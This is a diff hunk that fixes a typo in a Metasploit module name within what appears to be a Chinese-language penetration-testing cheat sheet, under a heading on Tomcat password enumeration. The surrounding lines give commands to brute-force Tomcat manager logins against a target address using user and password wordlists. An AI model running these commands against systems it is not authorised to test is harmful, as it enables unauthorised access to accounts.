@@ -2374,7 +2374,7 @@ run
 ### tomcat口令枚举
 
 search tomcat
-use auauxiliary/scanner/http/tomcat_mgr_login
+use auxiliary/scanner/http/tomcat_mgr_login
 set rhosts 192.168.1.1
 set pass_file /root/pass.txt
 set user_file /root/user.txt
